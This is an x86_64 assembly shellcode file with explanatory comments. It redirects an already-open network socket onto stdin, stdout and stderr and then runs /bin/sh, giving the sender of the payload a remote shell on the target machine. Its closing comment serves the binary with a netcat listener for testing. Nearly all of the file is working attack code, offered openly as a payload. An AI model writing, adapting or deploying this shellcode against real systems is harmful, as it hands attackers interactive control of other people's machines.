# x86_64, GAS syntax

# dup2 the network socket to stdin, stdout and stderr so that writing to stdout 
# and stderr causes a write to the network socket, and reads from stdin cause a
# read from the network socket.
# Then, spawn a shell, thus giving whatever deployed the shellcode shell access
# to who/whatever was silly enough to let it execute.

_spawnshell:
    # From Linux manpages 4.04, syscall(2)
    # syscall number in %rax (dup2)
    mov $33, %rax
    
    # argument 1 in %rdi already
    # (the socket which we downloaded the shellcode through)

    # argument 2 in %rsi (stdout)
    mov $1, %rsi

    # call the kernel!
    syscall

    # syscall number in %rax (dup2)
    mov $33, %rax
    # argument 2 in %rsi (stdin)
    mov $0, %rsi
    # call.
    syscall

    # you get the idea
    mov $33, %rax
    mov $2, %rsi
    syscall

    # syscall number in %rax (execve)
    mov $59, %rax

    # arg1 in $rdi (program to execute)
    lea shell(%rip), %rdi

    # arg2 in $rsi (argv, NULL)
    xor %rsi, %rsi

    # arg3 in $rdx (envp, NULL)
    xor %rdx, %rdx

    syscall

    # (this point is unreached)
shell:
    .ascii "/bin/sh\0"
shell_end:
padding:
    .align 65536, 0
command:
# you can put commands that you want to immediately execute here
    .string "id\n"


# firwroks test server:
# cat spawnshell.bin - | nc -vlp 31337
